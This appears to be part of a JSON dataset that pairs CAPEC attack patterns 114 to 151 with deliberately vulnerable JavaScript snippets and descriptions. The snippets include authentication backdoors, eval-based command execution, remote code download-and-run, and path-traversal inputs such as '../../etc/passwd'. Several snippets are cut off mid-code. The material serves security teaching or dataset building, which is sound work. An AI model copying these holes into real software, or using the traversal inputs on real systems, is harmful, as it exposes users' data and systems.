        "description": "\"This code demonstrates multiple interface manipulation vulnerabilities including unprotected IOCTL commands, lack of access control for register interfaces, exposed debug functionality, and unprotected shadow register access. The code allows unrestricted access to device registers and debug features without proper authentication or access control mechanisms, making it susceptible to unauthorized manipulation.\""
    },
    {
        "capec_id": "114",
        "capec_name": "Authentication Abuse",
        "code_snippet": "const users = new Map();\nusers.set('admin', 'password123');\n\nclass AuthService {\n    constructor() {\n        this.loginAttempts = {};\n        this.debugMode = true;\n    }\n\n    authenticate(username, password) {\n        // Debug backdoor - vulnerable!\n        if (this.debugMode && password.includes('debug_')) {\n            return true;\n        }\n\n        // No rate limiting on login attempts\n        if (!this.loginAttempts[username]) {\n            this.loginAttempts[username] = 1;\n        } else {\n            this.loginAttempts[username]++;\n        }\n\n        // Weak password check\n        return users.get(username) === password;\n    }\n\n    isAuthorized(token) {\n        // Bypass authentication if token contains special string\n        if (token && token.includes('bypass_auth')) {\n            return true;\n        }\n        return false;\n    }\n}\n\nconst auth = new AuthService();",
        "description": "This vulnerable authentication code demonstrates multiple security issues: lack of brute force protection, debug backdoor access, weak authentication checks, and an authentication bypass mechanism. It includes a debug mode that allows access with special passwords, no rate limiting for login attempts, and a bypass token mechanism that can circumvent normal authentication."
    },
    {
        "capec_id": "115",
        "capec_name": "Authentication Bypass",
        "code_snippet": "`\nfunction authenticateUser(username, password) {\n  // Weak authentication mechanism using client-side checks\n  const isAdmin = localStorage.getItem('isAdmin');\n  \n  if (isAdmin === 'true') {\n    return true; // Bypass authentication if isAdmin is set in localStorage",
        "description": "\"This code demonstrates multiple authentication vulnerabilities including bypassing authentication through client-side storage manipulation, hardcoded backdoor credentials, insufficient token validation, and weak credential verification. It allows attackers to gain unauthorized access through multiple paths without proper authentication.\""
    },
    {
        "capec_id": "116",
        "capec_name": "Excavation",
        "code_snippet": "function searchUserData(searchTerm) {\n  const userDataPath = process.env.USER_DATA_PATH || '/data/';\n  const debugMode = process.env.DEBUG_MODE === 'true';\n  \n  // Expose sensitive data in debug mode\n  if (debugMode) {\n    console.log('DEBUG: System paths:', process.env);\n    console.log('DEBUG: User credentials:', require('./credentials.json'));\n  }\n\n  // Allowing external path manipulation\n  const searchPath = userDataPath + searchTerm;\n  \n  // Create temporary files for search results\n  const tempFile = `/tmp/search_${Date.now()}.log`;\n  fs.writeFileSync(tempFile, searchTerm);\n  \n  // Arbitrary file read based on user input\n  return fs.readFileSync(searchPath, 'utf8');\n}",
        "description": "A vulnerable function that probes for sensitive information through debug mode, creates emergent resources via temporary files, and allows path manipulation through untrusted search paths. It exposes system information and credentials in debug mode, and enables potential unauthorized access to sensitive data."
    },
    {
        "capec_id": "117",
        "capec_name": "Interception",
        "code_snippet": "`\n// Sensitive user authentication service\nconst userAuthService = {\n    login: function(username, password) {\n        // Send credentials over unencrypted HTTP\n        const xhr = new XMLHttpRequest();\n        xhr.open('POST', 'http://example.com/login', true);\n        xhr.setRequestHeader('Content-Type', 'application/json');\n        \n        // Sending sensitive data in cleartext\n        const data = {\n            username: username,\n            password: password,\n            sessionId: Math.random().toString(),\n            creditCard: '4111-1111-1111-1111'",
        "description": "\"This code demonstrates multiple vulnerabilities related to data stream monitoring and sniffing. It transmits sensitive information (credentials, credit card) in cleartext over HTTP, uses unencrypted WebSocket connections, lacks message integrity checks, and doesn't implement any protection against network sniffing. The code also doesn't validate incoming messages, making it susceptible to message tampering and data manipulation attacks.\""
    },
    {
        "capec_id": "120",
        "capec_name": "Double Encoding",
        "code_snippet": "function processUserInput(input) {\n    // Vulnerable validation that only checks for single encoding\n    if (input.includes('%2E') || input.includes('.')) {\n        return 'Invalid input';\n    }\n    \n    // Decodes the input only once, missing double encoding\n    let decodedInput = decodeURIComponent(input);\n    \n    // Uses the potentially malicious input in file operations\n    let filePath = './userfiles/' + decodedInput;\n    return readFileContents(filePath);\n}\n\n// Example usage with double encoding\n// %252E%252E%252F%252E%252E%252F etc/passwd\n// Will be decoded to %2E%2E/%2E%2E/etc/passwd\n// Then to ../../../etc/passwd",
        "description": "This code demonstrates a vulnerable input validation system that fails to handle double URL encoding. The validation check only looks for single-encoded dots (%2E) or literal dots, but misses double-encoded sequences (%252E). This allows an attacker to bypass the validation using double encoding, potentially enabling directory traversal attacks. The code also demonstrates improper input validation (CWE-20), incorrect comparison (CWE-697), and improper handling of URL encoding (CWE-177)."
    },
    {
        "capec_id": "121",
        "capec_name": "Exploit Non-Production Interfaces",
        "code_snippet": "// Debug mode configuration\nconst DEBUG_MODE = true;\nconst DEBUG_TOKEN = 'debug_master_key_123';\n\nclass ProductionSystem {\n    constructor() {\n        this.sensitiveData = {\n            userCredentials: 'admin:supersecret',\n            apiKeys: ['key1', 'key2', 'key3'],\n            customerRecords: ['record1', 'record2']\n        };\n    }\n\n    debug(token) {\n        if (DEBUG_MODE && token === DEBUG_TOKEN) {\n            console.log('DEBUG INFO:', {\n                system: process.env,\n                memory: process.memoryUsage(),\n                data: this.sensitiveData,\n                stackTrace: new Error().stack\n            });\n            return true;\n        }\n        return false;\n    }\n\n    executeCommand(cmd, debugToken = null) {\n        if (debugToken && this.debug(debugToken)) {\n            // Debug backdoor - allows any command execution\n            return eval(cmd);\n        }\n        // Normal command processing\n        return `Executing: ${cmd}`;\n    }\n}",
        "description": "This vulnerable code demonstrates an active debug interface in a production system with hard-coded debug tokens, exposed sensitive information through debug messages, and a dangerous debug backdoor allowing arbitrary code execution. The debug mode is permanently enabled, debug tokens are not properly secured, and sensitive system information is exposed through debug logs. The code also includes an unsafe eval() execution path accessible through debug mode."
    },
    {
        "capec_id": "122",
        "capec_name": "Privilege Abuse",
        "code_snippet": "const adminPanel = {\n  sensitiveData: 'confidential info',\n  updateSettings: function(newSettings) {\n    this.settings = newSettings;\n  },\n  settings: {}\n};\n\nfunction handleRequest(user, action, data) {\n  // No proper privilege check before accessing admin functions\n  if (action === 'getAdminData') {\n    return adminPanel.sensitiveData;\n  } else if (action === 'updateSettings') {\n    adminPanel.updateSettings(data);\n    return 'Settings updated';\n  }\n}\n\n// Any user can access admin functions\nconst regularUser = { id: 123, role: 'user' };\nconst result = handleRequest(regularUser, 'getAdminData', null);\nconsole.log(result); // Prints confidential info",
        "description": "This code demonstrates improper privilege management by failing to implement access controls for administrative functions. The handleRequest function allows any user to access sensitive admin data and modify system settings without verifying their privileges or role. The adminPanel object's methods are exposed without proper authorization checks, violating the principle of privilege separation."
    },
    {
        "capec_id": "123",
        "capec_name": "Buffer Manipulation",
        "code_snippet": "function processUserData(inputData) {\n    let buffer = new Uint8Array(10);\n    let offset = parseInt(inputData.offset);\n    \n    // Copy data from source without bounds checking\n    for(let i = 0; i < inputData.data.length; i++) {\n        buffer[offset + i] = inputData.data[i];\n    }\n    \n    // Read data beyond buffer bounds\n    let result = [];\n    for(let i = offset; i < offset + 20; i++) {\n        result.push(buffer[i]);\n    }\n    return result;\n}",
        "description": "This code demonstrates vulnerable buffer access by allowing arbitrary offsets for reading/writing without bounds checking. It can lead to buffer overflows and out-of-bounds memory access when processing user-controlled input data. The function uses an unchecked offset and performs operations that can read beyond the allocated buffer size of 10 bytes."
    },
    {
        "capec_id": "124",
        "capec_name": "Shared Resource Manipulation",
        "code_snippet": "let sharedResource = 0;\n\nconst trustedThread = () => {\n    // Trusted application writing sensitive data\n    sharedResource = 123456; // sensitive value\n    // Missing proper synchronization\n};\n\nconst untrustedThread = () => {\n    // Malicious application reading/modifying shared data\n    const stolenData = sharedResource;\n    sharedResource = -1; // Corrupting the shared resource\n};\n\n// Concurrent access to shared resource without proper isolation or locks\nsetTimeout(trustedThread, 0);\nsetTimeout(untrustedThread, 0);",
        "description": "Vulnerable code demonstrating improper isolation of a shared resource between trusted and untrusted execution contexts. The code lacks proper synchronization mechanisms and access controls, allowing simultaneous access to a shared variable that could lead to race conditions, data leakage, and resource corruption."
    },
    {
        "capec_id": "125",
        "capec_name": "Flooding",
        "code_snippet": "const http = require('http');\n\nconst server = http.createServer((req, res) => {\n    let data = '';\n    \n    // Create a large buffer for each request without limits\n    const largeBuffer = Buffer.alloc(1024 * 1024 * 100);\n    \n    // Store connection in array without cleanup\n    global.connections = global.connections || [];\n    global.connections.push(req.connection);\n    \n    req.on('data', chunk => {\n        // Accumulate data without size checks\n        data += chunk;\n    });\n    \n    // Process request without rate limiting\n    heavyOperation();\n    \n    res.end('Processed');\n});\n\nfunction heavyOperation() {\n    // CPU intensive operation\n    for(let i = 0; i < 1000000; i++) {\n        Math.random() * Math.random();\n    }\n}\n\nserver.listen(3000);",
        "description": "This code demonstrates multiple resource-related vulnerabilities: no request rate limiting, unbounded memory allocation per request, no cleanup of stored connections, and CPU-intensive operations without throttling. This makes the server susceptible to flooding attacks through multiple concurrent connections and large payload submissions."
    },
    {
        "capec_id": "126",
        "capec_name": "Path Traversal",
        "code_snippet": "const fs = require('fs');\nconst express = require('express');\nconst app = express();\n\napp.get('/download', function(req, res) {\n    const userInput = req.query.filename;\n    const filePath = './files/' + userInput;\n    \n    fs.readFile(filePath, function(err, data) {\n        if (err) {\n            res.status(404).send('File not found');\n            return;\n        }\n        res.send(data);\n    });\n});\n\napp.listen(3000);",
        "description": "A vulnerable file download endpoint that accepts a filename parameter without properly validating or sanitizing the path. An attacker can exploit this by using '../' sequences (e.g., '../../etc/passwd' as the filename) to traverse outside the intended directory and access sensitive files on the system."
    },
    {
        "capec_id": "127",
        "capec_name": "Directory Indexing",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst path = require('path');\nconst fs = require('fs');\n\napp.get('/files/*', (req, res) => {\n    const requestedPath = path.join(__dirname, 'storage', req.params[0]);\n    \n    fs.stat(requestedPath, (err, stats) => {\n        if (err) {\n            res.status(404).send('Not found');\n            return;\n        }\n        \n        if (stats.isDirectory()) {\n            fs.readdir(requestedPath, (err, files) => {\n                if (err) {\n                    res.status(500).send('Error reading directory');\n                    return;\n                }\n                res.json(files);\n            });\n        } else {\n            res.sendFile(requestedPath);\n        }\n    });\n});\n\napp.listen(3000);",
        "description": "This vulnerable code implements a file server that allows directory listing and file access without any authentication or proper authorization. It directly exposes the contents of directories when a path ending in a directory is requested, and doesn't validate user permissions or restrict access to sensitive directories. The code allows path traversal and forced browsing, potentially exposing sensitive files and directory structures to unauthorized users."
    },
    {
        "capec_id": "128",
        "capec_name": "Integer Attacks",
        "code_snippet": "function processUserPoints(currentPoints, bonusPoints) {\n    let maxPoints = 2147483647;\n    let newPoints = currentPoints + bonusPoints;\n    \n    if (newPoints <= maxPoints) {\n        return newPoints;\n    } else {\n        return currentPoints;\n    }\n}\n\n// Vulnerable usage\nlet userPoints = 2147483640;\nlet bonus = 100;\nlet result = processUserPoints(userPoints, bonus);",
        "description": "This code demonstrates integer overflow vulnerability where adding two positive numbers can result in a negative value due to exceeding the maximum integer limit. The function fails to properly check for overflow conditions and only checks against a maximum value without considering wraparound effects. When large values are added together, the result can wrap around to negative numbers, potentially bypassing security checks or causing unexpected behavior."
    },
    {
        "capec_id": "129",
        "capec_name": "Pointer Manipulation",
        "code_snippet": "function processUserData(userInput) {\n  let buffer = new Uint8Array(10);\n  let offset = parseInt(userInput);\n  \n  // Vulnerable pointer arithmetic without bounds checking\n  let ptr = buffer.byteOffset + offset;\n  \n  // Attempting to access memory outside buffer bounds\n  let data = new Uint8Array(buffer.buffer, ptr, 4);\n  \n  // Potential NULL pointer dereference\n  let obj = null;\n  if(offset > 0) {\n    obj = { value: data[0] };\n  }\n  return obj.value; // Will crash if obj is null\n}",
        "description": "This code demonstrates multiple pointer-related vulnerabilities including untrusted pointer arithmetic, out-of-range pointer offset manipulation, improper memory buffer bounds checking, and NULL pointer dereferencing. The function accepts user input to calculate a memory offset, which can be manipulated to access memory outside the intended buffer bounds or trigger a null pointer dereference."
    },
    {
        "capec_id": "130",
        "capec_name": "Excessive Allocation",
        "code_snippet": "function processUserData(data) {\n    let dataChunks = [];\n    // Recursive function that keeps allocating memory\n    function splitAndStore(chunk) {\n        if (chunk.length > 0) {\n            // Create new arrays without size limits\n            let firstHalf = chunk.slice(0, chunk.length/2);\n            let secondHalf = chunk.slice(chunk.length/2);\n            // Store both halves\n            dataChunks.push(Buffer.from(firstHalf));\n            dataChunks.push(Buffer.from(secondHalf));\n            // Recursively process both halves\n            splitAndStore(firstHalf);\n            splitAndStore(secondHalf);\n        }\n    }\n    \n    // Start processing without any size checks\n    splitAndStore(data);\n    // Resource is never properly released\n    return 'Processing complete';\n}",
        "description": "This vulnerable code demonstrates unbounded memory allocation through recursive processing of data chunks. It creates a resource exhaustion vulnerability by continuously splitting and storing data without limits, never releasing the allocated memory, and lacking any throttling mechanisms. A malicious user could send a large payload that would trigger excessive memory allocation, potentially causing the application to crash or become unresponsive."
    },
    {
        "capec_id": "131",
        "capec_name": "Resource Leak Exposure",
        "code_snippet": "function processUserRequests() {\n    let fileHandles = [];\n    \n    function handleRequest(data) {\n        const file = require('fs').openSync('data.txt', 'w');\n        fileHandles.push(file);\n        \n        // Process data but never close the file handle\n        if(data.error) {\n            // Return early without cleanup\n            return;\n        }\n        \n        // Continue processing without proper resource management\n        processMoreData(file);\n        \n        // File handle is never closed with closeSync()\n    }\n    \n    // Start processing multiple requests\n    setInterval(() => {\n        handleRequest({ data: 'user_input' });\n    }, 100);\n}\n\nprocessUserRequests();",
        "description": "This code demonstrates a resource leak vulnerability where file handles are continuously opened but never properly closed. The program creates new file handles for each request without releasing them, leading to resource exhaustion. The handles are stored in an array but never cleaned up, and early returns in error conditions bypass cleanup. This can eventually cause the system to run out of available file handles, preventing legitimate operations from succeeding."
    },
    {
        "capec_id": "132",
        "capec_name": "Symlink Attack",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction processUserUpload(userFileName) {\n    const uploadDir = '/uploads/';\n    const filePath = path.join(uploadDir, userFileName);\n    \n    // Vulnerable: No validation of symlinks or file path\n    if (fs.existsSync(filePath)) {\n        // Race condition window between check and use\n        const data = fs.readFileSync(filePath);\n        fs.writeFileSync('/processed/' + userFileName, data);\n        return true;\n    }\n    return false;\n}",
        "description": "This code contains multiple vulnerabilities related to symbolic link following. It accepts a user-controlled filename, does not validate against symlinks, and has a time-of-check to time-of-use (TOCTOU) race condition. An attacker could create a symbolic link pointing to sensitive files outside the intended directory, and the code would follow it without proper validation."
    },
    {
        "capec_id": "133",
        "capec_name": "Try All Common Switches",
        "code_snippet": "`\nconst app = {\n    // Hidden debug functionality not documented in public API\n    _debugMode: false,\n    secretKey: 'abc123',\n    \n    processCommand: function(cmd, args) {\n        try {\n            // Incomplete list of disallowed commands\n            const blockedCommands = ['delete', 'remove'];\n            \n            if (args.includes('--debug')) {\n                this._debugMode = true;\n                // Debug mode reveals sensitive information\n                console.log('Debug Info:', {\n                    secretKey: this.secretKey,\n                    systemConfig: process.env,\n                    internalState: this._getInternalState()",
        "description": "\"This code demonstrates a vulnerable application with hidden debug functionality that can be triggered using command-line arguments. It contains an incomplete list of blocked commands, ignores error conditions, and exposes sensitive information when debug mode is enabled. The deep coupling between layers and unsafe command execution creates security risks.\""
    },
    {
        "capec_id": "134",
        "capec_name": "Email Injection",
        "code_snippet": "`\nfunction sendEmail(recipient, subject, body) {\n  const mailHeaders = {\n    'To': recipient,\n    'Subject': subject,\n    'Content-Type': 'text/plain'",
        "description": "\"This code demonstrates vulnerable email header handling by directly concatenating user input into SMTP headers without proper sanitization. It allows attackers to inject additional headers using CRLF sequences (\\\\r\\\\n), potentially leading to email header injection attacks. The code fails to neutralize special characters, allowing manipulation of email routing and content type.\""
    },
    {
        "capec_id": "135",
        "capec_name": "Format String Injection",
        "code_snippet": "`\n    function displayUserMessage(userInput) {\n        let template = document.getElementById('messageTemplate').innerHTML;\n        let formattedMessage = template.replace('%s', userInput);\n        document.getElementById('output').innerHTML = formattedMessage;\n        \n        // Vulnerable implementation with dynamic eval\n        let formatFunction = new Function('return \"' + formattedMessage + '\"');\n        let result = formatFunction();\n        \n        // Vulnerable logging with string formatting\n        console.log('User message: %s', userInput);",
        "description": "\"This code is vulnerable to format string injection by accepting unvalidated user input and using it directly in string formatting operations. It uses dynamic function creation with new Function() and template string replacement without proper sanitization, allowing potential code execution and memory manipulation through format specifiers.\""
    },
    {
        "capec_id": "136",
        "capec_name": "LDAP Injection",
        "code_snippet": "const ldap = require('ldapjs');\n\nfunction authenticateUser(userInput) {\n    const client = ldap.createClient({\n        url: 'ldap://localhost:389'\n    });\n    \n    const filter = `(uid=${userInput})`; // Vulnerable to LDAP injection\n    \n    client.search('dc=example,dc=com', {\n        filter: filter,\n        scope: 'sub'\n    }, function(err, res) {\n        res.on('searchEntry', function(entry) {\n            console.log('Found user:', entry.object);\n        });\n    });\n}",
        "description": "This code contains an LDAP injection vulnerability where user input is directly concatenated into an LDAP filter without proper sanitization. An attacker could input special characters or LDAP operators (like * or |) to manipulate the query and potentially access unauthorized information about other users in the directory."
    },
    {
        "capec_id": "137",
        "capec_name": "Parameter Injection",
        "code_snippet": "app.get('/search', function(req, res) {\n  let userQuery = req.query.q;\n  let apiEndpoint = 'http://api.example.com/data?query=' + userQuery;\n  \n  fetch(apiEndpoint)\n    .then(response => response.json())\n    .then(data => {\n      res.send(data);\n    });\n});",
        "description": "This code accepts an unvalidated query parameter and directly concatenates it into an API endpoint URL, making it vulnerable to parameter injection attacks. An attacker can inject additional parameters using '&' to modify the API request behavior, potentially accessing unauthorized data or altering the intended functionality."
    },
    {
        "capec_id": "138",
        "capec_name": "Reflection Injection",
        "code_snippet": "`\n    // User input from a form or parameter\n    let className = req.body.className;\n    let methodName = req.body.methodName;\n\n    // Unsafe reflection using dynamic evaluation\n    let targetClass = require(className);\n    let instance = new targetClass();\n    \n    // Dynamically invoke method based on user input\n    let result = instance[methodName].apply(instance, req.body.args);\n    \n    // Send result back to user\n    res.json({ data: result",
        "description": "\"This code demonstrates unsafe reflection by allowing user-controlled input to dictate which classes are loaded and which methods are invoked dynamically, potentially leading to unauthorized code execution. The code accepts external input for class and method names without validation, allowing an attacker to load arbitrary modules and execute unintended methods.\""
    },
    {
        "capec_id": "139",
        "capec_name": "Relative Path Traversal",
        "code_snippet": "const fs = require('fs');\nfunction readUserFile(userInput) {\n  const basePath = '/var/www/files/';\n  const filePath = basePath + userInput;\n  try {\n    const data = fs.readFileSync(filePath, 'utf8');\n    return data;\n  } catch(err) {\n    return 'Error reading file';\n  }\n}",
        "description": "This code is vulnerable to path traversal attacks as it directly concatenates user input to the base path without sanitization. An attacker can use '../' sequences (e.g., '../../../../etc/passwd') to access files outside the intended directory."
    },
    {
        "capec_id": "140",
        "capec_name": "Bypassing of Intermediate Forms in Multiple-Form Sets",
        "code_snippet": "// Form sequence handler\nconst formSequence = {\n    currentStep: 1,\n    userData: {},\n    \n    handleFormSubmit: function(formData) {\n        // No validation of form sequence or session state\n        const formName = formData.get('formName');\n        const stepNumber = parseInt(formName.replace('form', ''));\n        \n        // Directly accept user-provided step number without validation\n        this.currentStep = stepNumber;\n        \n        // Store data without verifying previous steps completion\n        this.userData[formName] = Object.fromEntries(formData);\n        \n        // No CSRF protection\n        this.saveToDatabase(this.userData);\n        \n        // Navigate to next form without checking if previous steps are complete\n        window.location.href = `/form${stepNumber + 1}.html`;\n    },\n    \n    saveToDatabase: function(data) {\n        // Directly use user-provided values for database key\n        const userId = data.form1?.userId || 'default';\n        fetch(`/api/save/${userId}`, {\n            method: 'POST',\n            body: JSON.stringify(data)\n        });\n    }\n}",
        "description": "This vulnerable code implements a multi-step form sequence without proper state validation, allowing users to skip steps by directly accessing form URLs. It lacks CSRF protection, proper session state management, and validation of form sequence completion. The code also uses user-controlled values for database keys without verification, potentially allowing unauthorized access to other users' data."
    },
    {
        "capec_id": "141",
        "capec_name": "Cache Poisoning",
        "code_snippet": "`\n// Cache management system for user data\nconst userDataCache = new Map();\n\nfunction fetchAndCacheUserData(userId) {\n  // Vulnerable: No validation of data source or authenticity\n  let userData = fetch('http://' + userId + '.data-service.com/user')\n    .then(response => response.json())\n    .then(data => {\n      // Vulnerable: Blindly caching data without verification\n      userDataCache.set(userId, {\n        personalInfo: data.personalInfo,\n        accessToken: data.accessToken,\n        lastUpdated: Date.now()",
        "description": "\"This code demonstrates vulnerable cache management that accepts and stores data without proper validation of its source or authenticity. It blindly trusts and caches data from an external source, making it susceptible to cache poisoning attacks. The cache also stores sensitive information (access tokens) without proper access controls, and there's no mechanism to verify the integrity of cached data before use.\""
    },
    {
        "capec_id": "142",
        "capec_name": "DNS Cache Poisoning",
        "code_snippet": "function resolveDomain(domainName) {\n    // Vulnerable DNS resolver implementation\n    let dnsCache = {\n        'www.bank.com': '10.0.0.99',  // Compromised cache entry\n        'login.secure.com': '192.168.1.100'\n    };\n\n    function reverseDNSLookup(ipAddress) {\n        // Vulnerable reverse DNS lookup without verification\n        const reverseDNS = {\n            '10.0.0.99': 'www.bank.com',\n            '192.168.1.100': 'login.secure.com'\n        };\n        return reverseDNS[ipAddress];\n    }\n\n    // Blindly trust the DNS cache without verification\n    const resolvedIP = dnsCache[domainName];\n    \n    // Vulnerable validation using reverse DNS\n    if (reverseDNSLookup(resolvedIP) === domainName) {\n        return resolvedIP;\n    }\n    \n    return null;\n}",
        "description": "This code demonstrates a vulnerable DNS resolver implementation that accepts potentially poisoned DNS cache entries without proper verification. It includes weak reverse DNS resolution for validation and blindly trusts the local DNS cache, making it susceptible to DNS cache poisoning attacks. The code fails to verify the authenticity of DNS data and relies on potentially compromised cache entries."
    },
    {
        "capec_id": "143",
        "capec_name": "Detect Unpublicized Web Pages",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst path = require('path');\n\napp.use('/public', express.static('public'));\napp.use('/backup', express.static('.git'));\napp.use('/temp', express.static('temp'));\n\n// Sensitive files stored under web root\napp.get('/download/:file', (req, res) => {\n    const file = req.params.file;\n    res.sendFile(path.join(__dirname, 'documents', file));\n});\n\n// No authentication check for admin pages\napp.get('/admin/users', (req, res) => {\n    res.sendFile(path.join(__dirname, 'admin', 'users.html'));\n});\n\n// Search functionality without access control\napp.get('/search', (req, res) => {\n    const query = req.query.q;\n    searchSensitiveDocuments(query);\n});\n\napp.listen(3000);",
        "description": "This code demonstrates multiple security vulnerabilities including exposed sensitive directories, lack of authentication for restricted areas, direct file access without proper authorization, and exposed version control repository. The code allows direct access to files and directories that should be protected, implements no access controls for admin sections, and exposes internal file structures."
    },
    {
        "capec_id": "144",
        "capec_name": "Detect Unpublicized Web Services",
        "code_snippet": "// Express.js server setup\nconst express = require('express');\nconst app = express();\n\n// Sensitive admin endpoints without authentication\napp.get('/admin/config', (req, res) => {\n    res.json({\n        dbConnection: 'mongodb://admin:password@localhost:27017',\n        apiKeys: {\n            stripe: 'sk_live_123456789',\n            aws: 'AKIAIOSFODNN7EXAMPLE'\n        }\n    });\n});\n\n// Exposed WSDL file without access control\napp.get('/services/api.wsdl', (req, res) => {\n    res.sendFile('/path/to/api.wsdl');\n});\n\n// Download and execute remote code without verification\napp.get('/update-system', (req, res) => {\n    const http = require('http');\n    const fs = require('fs');\n    const remoteScript = 'http://updates.example.com/patch.js';\n    \n    http.get(remoteScript, (response) => {\n        const fileStream = fs.createWriteStream('patch.js');\n        response.pipe(fileStream);\n        fileStream.on('finish', () => {\n            require('./patch.js').execute();\n            res.send('Update complete');\n        });\n    });\n});\n\n// Exposed version control directory\napp.use('/repo', express.static('.git'));",
        "description": "This code demonstrates multiple vulnerabilities including unauthenticated access to sensitive admin endpoints, exposed WSDL files, downloading and executing unchecked remote code, and exposed version control files. The code lacks proper access controls, authentication mechanisms, and logging of security events."
    },
    {
        "capec_id": "145",
        "capec_name": "Checksum Spoofing",
        "code_snippet": "`\n    function verifyMessageChecksum(message, providedChecksum) {\n      // Weak hash function using simple XOR\n      function weakHash(data) {\n        let hash = 0;\n        for (let i = 0; i < data.length; i++) {\n          hash ^= data.charCodeAt(i);",
        "description": "\"This vulnerable code implements a weak checksum verification system using multiple flawed approaches: it uses a weak XOR-based hash function that's easily predictable, performs no validation of the checksum format or length, uses direct string comparison for checksum verification, and lacks any additional integrity checks during message processing. An attacker could easily craft a modified message with a matching checksum to bypass the verification.\""
    },
    {
        "capec_id": "146",
        "capec_name": "XML Schema Poisoning",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst xml2js = require('xml2js');\nconst xpath = require('xpath');\nconst dom = require('xmldom').DOMParser;\n\napp.post('/process-xml', (req, res) => {\n    const userSchema = req.body.schema;\n    const userXML = req.body.xml;\n    \n    // Vulnerable: No schema validation\n    const parser = new xml2js.Parser({\n        explicitRoot: false,\n        normalizeTags: true,\n        async: false\n    });\n\n    // Vulnerable: Using external schema without validation\n    const doc = new dom().parseFromString(userXML);\n    const schemaDoc = new dom().parseFromString(userSchema);\n\n    // Vulnerable: Direct use of user input in XPath\n    const userQuery = req.body.query;\n    const nodes = xpath.select(userQuery, doc);\n\n    res.json({ result: nodes });\n});",
        "description": "This code snippet demonstrates XML schema poisoning by accepting untrusted XML schema and documents without proper validation. It allows direct manipulation of XML schema, processing of unvalidated XML content, and vulnerable XPath queries. The code accepts external control of XML schema and documents, lacks proper input validation, and is susceptible to XPath injection attacks."
    },
    {
        "capec_id": "147",
        "capec_name": "XML Ping of the Death",
        "code_snippet": "const https = require('https');\nconst xml2js = require('xml2js');\n\nconst server = https.createServer((req, res) => {\n    if (req.method === 'POST') {\n        let xmlData = '';\n        req.on('data', chunk => {\n            xmlData += chunk;\n            // No size limits on incoming data\n        });\n\n        req.on('end', () => {\n            // Process every XML message without validation or rate limiting\n            xml2js.parseString(xmlData, (err, result) => {\n                if (err) {\n                    res.end('Error');\n                    return;\n                }\n                \n                // Expensive processing on each request\n                for(let i = 0; i < 1000000; i++) {\n                    JSON.stringify(result);\n                }\n                \n                res.writeHead(200, { 'Content-Type': 'application/xml' });\n                res.end('<response>Processed</response>');\n            });\n        });\n    }\n});\n\nserver.listen(3000);",
        "description": "This vulnerable code creates an HTTP server that processes XML messages without any validation, rate limiting, or resource constraints. It performs expensive operations on each request and doesn't limit the size of incoming data, making it susceptible to XML-based DoS attacks. The server processes all incoming XML without schema validation and performs resource-intensive operations repeatedly, potentially leading to resource exhaustion."
    },
    {
        "capec_id": "148",
        "capec_name": "Content Spoofing",
        "code_snippet": "// Client-side JavaScript handling form submission\nfunction submitForm() {\n    let formData = new FormData(document.getElementById('paymentForm'));\n    \n    // No origin verification or CSRF protection\n    fetch('https://api.payment-processor.com/process', {\n        method: 'POST',\n        body: formData,\n        // Missing integrity checks and authentication headers\n        credentials: 'include'\n    })\n    .then(response => response.text())\n    .then(data => {\n        // Directly inserting response into DOM without sanitization\n        document.getElementById('result').innerHTML = data;\n        \n        // Redirecting based on unverified response\n        if(data.includes('success')) {\n            window.location.href = data.redirect_url;\n        }\n    });\n}",
        "description": "This vulnerable code demonstrates content spoofing risks by lacking proper data authenticity checks, missing CSRF protections, and performing unsafe DOM manipulation with unverified data. It accepts and processes responses without verifying their integrity or origin, and performs redirects based on potentially spoofed response data."
    },
    {
        "capec_id": "149",
        "capec_name": "Explore for Predictable Temporary File Names",
        "code_snippet": "const fs = require('fs');\nconst os = require('os');\n\nfunction processSensitiveData(userData) {\n    const tempFileName = 'data_' + userData.id + '.tmp';\n    const tempPath = os.tmpdir() + '/' + tempFileName;\n    \n    // Write sensitive data to predictable temp file\n    fs.writeFileSync(tempPath, JSON.stringify(userData), { mode: 0o666 });\n    \n    // Process the data\n    setTimeout(() => {\n        // Read and process temp file\n        const data = fs.readFileSync(tempPath);\n        // ... processing ...\n        \n        // Attempt to cleanup\n        fs.unlinkSync(tempPath);\n    }, 5000);\n\n    return tempPath;\n}",
        "description": "This vulnerable code creates a temporary file with predictable naming in a shared directory with unsafe permissions. It uses user input to form the filename, writes sensitive data with world-readable permissions (0o666), and leaves a time window where the file exists unprotected. The file path is also returned, potentially exposing its location."
    },
    {
        "capec_id": "150",
        "capec_name": "Collect Data from Common Resource Locations",
        "code_snippet": "const fs = require('fs');\nconst os = require('os');\n\nclass SystemManager {\n    constructor() {\n        this.sensitiveData = new Map();\n        this.debugMode = false;\n    }\n\n    storeCredentials(username, password) {\n        const credentialsPath = '/etc/app/credentials.txt';\n        fs.writeFileSync(credentialsPath, `${username}:${password}`, 'utf8');\n        this.sensitiveData.set('credentials', { username, password });\n    }\n\n    enableDebugMode() {\n        this.debugMode = true;\n        // Sensitive data remains in memory during debug mode\n        console.log('Debug info:', this.sensitiveData);\n    }\n\n    cleanup() {\n        // Incomplete cleanup - data remains in memory\n        this.sensitiveData.clear();\n        // No secure file deletion\n    }\n\n    decommission() {\n        // Basic deletion without proper scrubbing\n        fs.unlinkSync('/etc/app/credentials.txt');\n        this.sensitiveData = null;\n    }\n}",
        "description": "This code demonstrates multiple security vulnerabilities including storing sensitive data in well-known locations (/etc/), improper handling of sensitive data during debug mode, insufficient cleanup of sensitive information during decommissioning, and lack of proper data scrubbing. It leaves sensitive data exposed in memory and filesystem, making it susceptible to unauthorized access."
    },
    {
        "capec_id": "151",
        "capec_name": "Identity Spoofing",
        "code_snippet": "const checkAuth = (requestHeader) => {\n  // Vulnerable: Assumes IP-based authentication is sufficient\n  const trustedIPs = ['192.168.1.1', '10.0.0.1'];\n  const clientIP = requestHeader['X-Forwarded-For'] || requestHeader['IP'];\n  \n  // Weak authentication based on easily spoofable data\n  if (trustedIPs.includes(clientIP)) {\n    const userSession = {\n      isAuthenticated: true,\n      role: 'admin',\n      token: 'static-secret-token'\n    };\n    return userSession;\n  }\n  return { isAuthenticated: false };\n}",
